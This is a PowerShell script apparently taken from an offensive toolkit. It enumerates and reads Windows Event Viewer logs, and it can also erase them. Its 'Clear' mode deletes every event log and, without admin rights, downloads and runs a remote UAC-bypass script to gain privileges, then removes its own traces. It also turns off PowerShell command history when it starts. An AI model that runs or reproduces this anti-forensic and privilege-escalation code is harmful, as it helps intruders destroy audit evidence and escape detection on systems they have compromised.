﻿<#
.SYNOPSIS
   Enumerate\Read\Clear eventvwr logfiles!

   Author: r00t-3xp10it
   Tested Under: Windows 10 (19042) x64 bits
   Required Dependencies: none
   Optional Dependencies: wevtutil
   PS cmdlet Dev version: v1.4.11

.DESCRIPTION
   This cmdlet displays a list of ALL eventvwr categorie entrys and there
   indevidual logfiles counter, it also list logfiles on categories sutch as:
   'Windows Powershell', 'PowerShell/Operational', 'Bits-Client/Operacional'
   on -GetLogs "verbose" mode, and displays the contents of logfiles based
   on there ID number if sellected -GetLogs "Yara" parameter @argument!

.NOTES
   Required Dependencies: wevtutil {native}
   The Clear @argument requires administrator privileges!
   To list multiple Id's then split the numbers by a [,] char!
   Example: .\GetLogs.ps1 -GetLogs Yara -Id "59,60,300,400,8002"
   If none ID or VERB paramets are used together with 'YARA' @argument,
   then this cmdlet will scan pre-defined event paths and ID's numbers!

.Parameter GetLogs
   Accepts arguments: Enum, Verbose, Yara, Clear

.Parameter NewEst
   How many event logs to display int value (default: 3)

.Parameter Id
   List logfiles by is EventID number

.Parameter Verb
   Accepts 'ONE' Eventvwr registry path to be scanned!

.EXAMPLE
   PS C:\> Get-Help .\GetLogs.ps1 -full
   Access this cmdlet comment based help

.EXAMPLE
   PS C:\> .\GetLogs.ps1 -GetLogs Enum
   Lists ALL eventvwr categorie entrys

.EXAMPLE
   PS C:\> .\GetLogs.ps1 -GetLogs Verbose
   List newest 3 (default) Powershell\Application\System entrys

.EXAMPLE
   PS C:\> .\GetLogs.ps1 -GetLogs Verbose -NewEst 8
   List newest 8 Powershell\Application\System entrys

.EXAMPLE
   PS C:\> .\GetLogs.ps1 -GetLogs Yara -NewEst 28
   List newest 28 logs using cmdlet default Id's and categories!

.EXAMPLE
   PS C:\> .\GetLogs.ps1 -GetLogs Yara -NewEst 13 -Id 59
   List newest 13 logfiles with Id: 59 using cmdlet default categories!

.EXAMPLE
   PS C:\> .\GetLogs.ps1 -GetLogs Yara -verb "system" -Id 1 -NewEst 10
   List newest 10 logfiles of 'system' categorie with id: 1

.EXAMPLE
   PS C:\> .\redpill.ps1 -GetLogs Yara -Verb "Microsoft-Windows-NetworkProfile/Operational" -id 10001
   List newest 3 (default) logfiles of 'NetworkProfile/Operational' categorie with Id: 10001

.EXAMPLE
   PS C:\> .\GetLogs.ps1 -GetLogs Clear
   Remark: Clear function requires Administrator privileges!

.INPUTS
   None. You cannot pipe objects to GetLogs.ps1

.OUTPUTS
   Max(K) Retain OverflowAction    Entries Log                   
   ------ ------ --------------    ------- ---                            
   20 480      0 OverwriteAsNeeded   1 024 Application           
   20 480      0 OverwriteAsNeeded       0 HardwareEvents                 
   20 480      0 OverwriteAsNeeded      74 System                
   15 360      0 OverwriteAsNeeded      85 Windows PowerShell

.LINK
   https://github.com/r00t-3xp10it/redpill
   https://support.sophos.com/support/s/article/KB-000038860?language=en_US
   https://info.rocketcyber.com/blog/10-windows-security-events-you-need-to-monitor
   https://community.sophos.com/sophos-labs/b/blog/posts/powershell-command-history-forensics
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$GetLogs="Enum",
   [string]$Verb="False",
   [string]$Id="False",
   [int]$NewEst='3'
)


Write-Host ""
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
Write-Host "`nPlease Wait, Scanning Eventvwr registry! .." -ForegroundColor Green;Start-Sleep -Milliseconds 700
$IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")


If($GetLogs -ieq "Enum"){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Lists ALL eventvwr categorie entrys!

   .DESCRIPTION
      List ALL categorie logs and respective number of entrys!

   .Parameter GetLogs
      Accepts argument: Enum

   .EXAMPLE
      PS C:\> .\GetLogs.ps1 -GetLogs Enum
      Lists ALL eventvwr categorie entrys

   .OUTPUTS
      Max(K) Retain OverflowAction    Entries Log                   
      ------ ------ --------------    ------- ---                            
      20 480      0 OverwriteAsNeeded   1 024 Application           
      20 480      0 OverwriteAsNeeded       0 HardwareEvents                 
      20 480      0 OverwriteAsNeeded      74 System                
      15 360      0 OverwriteAsNeeded      85 Windows PowerShell
   #>


   ## List ALL event logs categories and the number of entries of each one!
   Get-EventLog -List | Format-Table -AutoSize | Out-String -Stream | ForEach-Object {
       $stringformat = If($_ -iMatch '\s+(Windows PowerShell)\s+'){
          @{ 'ForegroundColor' = 'Yellow' } }Else{ @{} }
       Write-Host @stringformat $_
    }

}


If($GetLogs -ieq "Verbose"){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - List Powershell \ Application \ System entrys!

   .DESCRIPTION
      This function allow users to returm a sellected (-NewEst) number
      of logfiles on 'Powershell', 'Applications' and 'system' registry
      Name with 'EventID,EntryType,Source,Message' Propertys displays!

   .Parameter GetLogs
      Accepts argument: Verbose

   .Parameter NewEst
      How many event logs to display int value (default: 3)

   .EXAMPLE
      PS C:\> .\GetLogs.ps1 -GetLogs Verbose
      List newest 3 (default) Powershell\Application\System entrys

   .EXAMPLE
      PS C:\> .\GetLogs.ps1 -GetLogs Verbose -NewEst 28
      List newest 28 Eventvwr Powershell\Application\System entrys

   .OUTPUTS
      enabled: true
      name: Windows Powershell
      logFileName: %SystemRoot%\System32\Winevt\Logs\Windows Powershell.evtx

      EventID EntryType   Source     Message                                                                                                          
      ------- ---------   ------     -------                                                                                                          
          400 Information PowerShell Provider "WSMan" is Started. ...                                                                                 
          600 Information PowerShell Provider "Certificate" is Started. ...                                                                           
          600 Information PowerShell Engine state is changed from None to Available. ...                                                              
          600 Information PowerShell Provider "Variable" is Started. ...                                                                              
          600 Information PowerShell Provider "Function" is Started. ...                                                                              
          403 Information PowerShell Provider "FileSystem" is Started. ...                                                                            
          600 Information PowerShell Provider "Environment" is Started. ...                                                                           
          600 Information PowerShell Provider "Alias" is Started. ...                                                                                 
          324 Information PowerShell Provider "Registry" is Started. ...                                                                              
          600 Information PowerShell Engine state is changed from Available to Stopped. ... 
   #>

   ## List ALL Event Logs
   Get-EventLog -List | Format-Table -AutoSize
   Start-Sleep -Seconds 1

   If($NewEst -lt "1" -or $NewEst -gt "80"){
      ## Set the max\min number of logfiles to display!
      Write-Host "[error] Bad -NewEst [$NewEst] input, defaulting to [3] .." -ForegroundColor Red -BackgroundColor Black
      Start-Sleep -Seconds 1;$NewEst = "3"
   }

   $Categories = @(
      "Windows Powershell",
      "Application",
      "System"
   )

   If($IsClientAdmin){## Administrator privileges!
      ## Add 'security' categorie to categories list
      # if the cmdlet was executed under Admin privs!
      $Categories += "Security"
   }


   ForEach($Item in $Categories){

      ## Local function Variable declarations!
      $SysLogCatg = wevtutil gl "$Item" | findstr /I /C:"name"
      $SysLogCatg = $SysLogCatg | findstr /V "logFileName:"
      $SysLogStat = wevtutil gl "$Item" | findstr /I "enabled"
      $SysLogFile = wevtutil gl "$Item" | findstr /I "logFileName"
      ## Delete Empty spaces in beggining and End of string
      $SysLogFile = $SysLogFile -replace '(^\s+|\s+$)',''

      Write-Host "`n$SysLogStat"
      Write-Host "$SysLogCatg" -ForegroundColor Green
      $Log = (Get-EventLog -LogName "$Item" -newest "$NewEst" -EA SilentlyContinue).EntryType

      If($? -ieq $False){
         Write-Host "$SysLogFile" ## $LASTEXITCODE return $False => NO logs!
         Write-Host "[error] None Eventvwr Entries found under $Item!" -ForegroundColor Red -BackgroundColor Black
      }Else{
         Write-Host "$SysLogFile" ## $LASTEXITCODE return $True => Logs present!
         Get-EventLog -LogName "$Item" -newest "$NewEst" -EA SilentlyContinue |
            Select-Object -Property EventID,EntryType,Source,Message | Format-Table -AutoSize
      }
   }

}


If($GetLogs -ieq "Yara"){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - List eventvwr logfiles by is Id number!

   .DESCRIPTION
      This function searchs for logfiles by is Id identifier number on
      'Windows Powershell', 'PowerShell/Operational' and 'Bits-Client'
      registry paths with 'Id,ContainerLog,TimeCreated,Message' Propertys!

   .NOTES
      To list multiple Id's then split the numbers by a [,] char!
      Example: .\GetLogs.ps1 -GetLogs Yara -Id "59,60,300,400,8002"
      If none ID or VERB paramets are used together with 'YARA' @argument,
      then this cmdlet will scan pre-defined event paths and ID's numbers!

   .Parameter GetLogs
      Accepts argument: Yara

   .Parameter NewEst
      How many event logs to display int value (default: 3)

   .Parameter Id
      List logfiles by is EventID number!

   .Parameter Verb
      Accepts 'ONE' Eventvwr registry path to be scanned! 

   .EXAMPLE
      PS C:\> .\GetLogs.ps1 -GetLogs Yara -NewEst 28
      List newest 28 logs using cmdlet default Id's and categories!

   .EXAMPLE
      PS C:\> .\GetLogs.ps1 -GetLogs Yara -NewEst 13 -Id 59
      List newest 13 logfiles with Id: 59 using cmdlet default categories!

   .EXAMPLE
      PS C:\> .\GetLogs.ps1 -GetLogs Yara -verb "system" -Id 1 -NewEst 10
      List newest 10 logfiles of 'system' categorie with id: 1

   .EXAMPLE
      PS C:\> .\GetLogs.ps1 -GetLogs Yara -Verb "Microsoft-Windows-NetworkProfile/Operational" -id 10001
      List newest 3 (default) logfiles of 'NetworkProfile/Operational' categorie with Id: 10001

   .OUTPUTS
      Id           : 403
      TimeCreated  : 10/05/2021 19:05:29
      ContainerLog : Windows Powershell
      Message      : Engine state is changed from Available to Stopped. 
              
                     Details: 
                   	 NewEngineState=Stopped
              	     PreviousEngineState=Available
              
              	     SequenceNumber=17
              
              	     HostName=ConsoleHost
              	     HostVersion=5.1.19041.906
              	     HostId=1b4fd01f-3d4e-4647-85bc-767e006a3f55
              	     HostApplication=C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -File 
                     C:\Users\pedro\AppData\Local\Temp\sysinfo.ps1 -SysInfo Verbose -HideMyAss false
              	     EngineVersion=5.1.19041.906
              	     RunspaceId=16168df0-b9cb-48b1-9c13-bd7885d30746
              	     PipelineId=
              	     CommandName=
              	     CommandType=
              	     ScriptName=
              	     CommandPath=
              	     CommandLine=
   #>

   ## Local function variable declarations!
   # Set the min number of logs to be displayed!
   If($NewEst -lt "1"){$NewEst = "3"}

   ## Categories list!
   $Categories = @(
      "Windows Powershell",
      "Microsoft-Windows-Applocker/EXE and DLL",
      "Microsoft-Windows-PowerShell/Operational",
      "Microsoft-Windows-Bits-Client/Operational",
      "Microsoft-Windows-Windows Defender/Operational"
   )    
 

   ## User Eventvwr Registry Path Input! (easter egg)
   # If sellected -verb "Microsoft-Windows-NetworkProfile/Operational" (or other path)
   # then the registry path will be appended to the default $Categories List and scanned!
   # WARNING: Some Eventvwr Registry Paths require administrator privileges to list entrys!
   If($Verb -ne "False" -and $Verb -Match '/'){

      If($Categories -NotContains "$Verb"){

         If($Id -eq "False"){Write-Host "[error] None -Id parameter argument enter, using cmdlet default ID's" -ForegroundColor Red -BackgroundColor Black}
         Write-Host "[WARNING]: Some Eventvwr paths migth require admin privs to list entrys!" -ForegroundColor Yellow
         Write-Host "Appending: '$Verb' to GetLogs Scan List!`n" -ForegroundColor DarkYellow
         $Categories += "$Verb" ## <-- Append User entry to GetLogs Default Scan List!
         Write-Host "GetLogs Scan List!" -ForegroundColor Green
         Write-Host "------------------";echo $Categories

      }Else{## User Input NOT present in Categories List!

         If($Id -eq "False"){## None user -ID parameter argument inputs!
         Write-Host "[error] None -Id parameter argument enter, using cmdlet default ID's" -ForegroundColor Red -BackgroundColor Black}       
         Write-Host "[error] -verb 'entry' allready exists in database, using cmdlet default List!" -ForegroundColor Red -BackgroundColor Black     
         Write-Host "`nGetLogs Scan List!" -ForegroundColor Green
         Write-Host "------------------";echo $Categories

      }
   }


   If($verb -ieq "system" -or $verb -ieq "application" -or $Verb -ieq "security"){
   
      If($Verb -ieq "security" -and $IsClientAdmin -eq $False){## Administrator privileges required to list 'security' categorie!
         Write-Host "[error] Administrator privileges required to list 'security' categorie!`n" -ForegroundColor Red -BackgroundColor Black
         exit ## Exit @GetLogs
      }


      If($Id -Match ','){

         ## Split Id's separated by [,] char!
         $IdList = $Id.Split(',')

      }ElseIf($Id -ieq "false"){

         If($verb -ieq "system"){

            ## Default Id's to scan! (if none user inputs)
            # ID: 1,19,43,1102,4663,7000,7045 -> system
            $RawLit = "1,19,43,1102,4663,7000,7045"
            $IdList = $RawLit.Split(',')
         
         }ElseIf($verb -ieq "application"){

            ## Default Id's to scan! (if none user inputs)
            # ID: 105,326,333,1000,1001 -> application
            $RawLit = "105,326,333,1000,1001"
            $IdList = $RawLit.Split(',')

         }ElseIf($verb -ieq "security"){

            ## Default Id's to scan! (if none user inputs)
            # 3,4624,4625,4672,4688  -> security
            $RawLit = "3,4624,4625,4672,4688"
            $IdList = $RawLit.Split(',')

         }

      }Else{## User input Id (only one ID number)

         $IdList = $Id
   
      }

      ## Loop trougth all Id numbers!
      ForEach($IdToken in $IdList){

         Get-EventLog -LogName "$verb" -EA SilentlyContinue | Where-Object {
            $_.EventId -eq $IdToken -and $_.Message -iNotMatch '^(Video.UI)' -and
            $_.Source -iNotMatch '^(Microsoft-Windows-Power-Troubleshooter)$'      
            } | Select-Object -Property EventID,EntryType,TimeGenerated,Source,Message -First $NewEst |
            Format-List | Out-String -Stream | ForEach-Object {
               $stringformat = If($_ -iMatch '^(TimeGenerated :)'){
                  @{ 'ForegroundColor' = 'Yellow' } }Else{ @{} }
               Write-Host @stringformat $_
            }

      }

   }Else{

      If($Id -Match ','){

         ## Split Id's separated by [,] char!
         $IdList = $Id.Split(',')

      }ElseIf($Id -ieq "false"){

         ## Default Id's to scan! (if none user inputs)
         # ID: 403                 -> POWERSHELL/OPERATIONAL
         # ID: 300,403             -> WINDOWS POWERSHELL
         # ID: 59,60               -> BITS
         # ID: 1116,1117,2000,5007 -> Windows Defender
         # ID: 800,8002            -> Applocke/exe and dll
         $RawLit = "59,60,300,403,800,1116,1117,2000,5007,8002"
         $IdList = $RawLit.Split(',')

      }Else{## User input Id (only one ID number)

         $IdList = $Id
   
      }


      ## Loop trougth all Id numbers!
      ForEach($IdToken in $IdList){

         ## Loop trougth all categories!
         ForEach($CatList in $Categories){

            Get-WinEvent -LogName "$CatList" -EA SilentlyContinue | Where-Object {
               $_.Id -eq $IdToken -and $_.Message -iNotMatch '(svchost.exe|.img.|.json.|.png.|.jpg.)' -and
               $_.LevelDisplayName -iMatch '^(Erro|Error|Aviso|Warning|Informações|Information)$'
               } | Select-Object -Property Id,TimeCreated,ContainerLog,Message -First $NewEst |
               Format-List | Out-String -Stream | ForEach-Object {
                  $stringformat = If($_ -iMatch '^(ContainerLog :)'){
                     @{ 'ForegroundColor' = 'Yellow' } }Else{ @{} }
                  Write-Host @stringformat $_
               }

         }

      }
   
   }

}


If($GetLogs -ieq "Clear"){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Clear 'ALL' eventvwr logfiles!

   .DESCRIPTION
      Loops trougth ALL eventvwr logfiles to delete them!

   .NOTES
      Required dependencies: wevtutil {native}
      Required dependencies: Administrator privs!
      If executed without administrator privileges then it
      uses EOP {@UacMe} technic that elevates shell privileges
      to administrator to be abble to run 'wevtutil cl' cmdline!

   .Parameter GetLogs
      Accepts argument: Clear

   .EXAMPLE
      PS C:\> .\GetLogs.ps1 -GetLogs Clear
      Delete ALL logfiles from eventvwr snapIn!
   #>


   If(-not($IsClientAdmin)){## wevtutil cl => requires Administrator rigths to run

      <#
      .SYNOPSIS
         Author: @r00t-3xp10it
         Helper - Clear 'ALL' eventvwr logfiles using EOP!

      .NOTES
         This function only triggers under UserLand privileges!

      .DESCRIPTION
         This function creates 'randomName.ps1' script on %tmp% then
         it downloads \ executes 'UacMe.ps1' from @redpill repository
         to be habble to delete ALL logfiles trougth EOP technic!
      #>


      $RawPScript = "wevtutil el | Foreach-Object { wevtutil cl `"`$_`" }"
      Write-Host "`n[error:] Administrator Privileges: False" -ForegroundColor Red -BackgroundColor Black
      Write-Host "[bypass] UacMe.ps1 -Action Elevate -Execute `"$RawPScript`"" -ForegroundColor Yellow
      Start-Sleep -Seconds 1

      ## create trigger.ps1 script into %tmp% directory!
      $RandomMe = -join ((65..90) + (97..122) | Get-Random -Count 7 | % {[char]$_})
      echo "$RawPScript" | Out-File "$Env:TMP\$RandomMe.ps1" -encoding ascii -force

      ## Download @UacMe from @redpill repository into %tmp%
      If(-not(Test-Path -Path "$Env:TMP\UacMe.ps1" -EA SilentlyContinue)){
         Write-Host "Downloading UacMe.ps1 from @redpill repository!"
         iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/UacMe.ps1" -OutFile "$Env:TMP\UacMe.ps1" -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
      }

      ## Execute @UacMe that executes '$RandomMe.ps1' that executes 'wevtutil cl' cmdline!
      Write-Host "Cleaning $Env:COMPUTERNAME\$Env:USERNAME Eventvwr logfiles ...`n"
      powershell -File "$Env:TMP\UacMe.ps1" -Action Elevate -Execute "powershell -File $Env:TMP\$RandomMe.ps1"


      ## clean all artifacts left behind!
      If(Test-Path -Path "$Env:TMP\$RandomMe.ps1" -EA SilentlyContinue){
         Remove-Item -Path "$Env:TMP\$RandomMe.ps1" -Force      
      }
      If(Test-Path -Path "$Env:TMP\UacMe.ps1" -EA SilentlyContinue){
         Remove-Item -Path "$Env:TMP\UacMe.ps1" -Force
      }


      ## List ALL event logs categories and
      # the number of entries of each one now!
      Get-EventLog -List | Format-Table -AutoSize

   }Else{

      ## Clear ALL event Logs
      Write-Host "[i] Administrator Privileges: True" -ForegroundColor Yellow
      Write-Host "[+] Cleaning $Env:COMPUTERNAME\$Env:USERNAME Eventvwr logfiles ...`n" -ForeGroundColor Green
      ## wevtutil cl "Microsoft-Windows-Powershell/Operational"  ## Clean Powershell logfiles
      ## wevtutil cl "Microsoft-Windows-Bits-Client/Operational" ## Clean BITS-TRANSFER logfiles
      wevtutil el | Foreach-Object { wevtutil cl "$_" }

      ## List ALL event logs categories and
      # the number of entries of each one now!
      Get-EventLog -List | Format-Table -AutoSize

   }

}
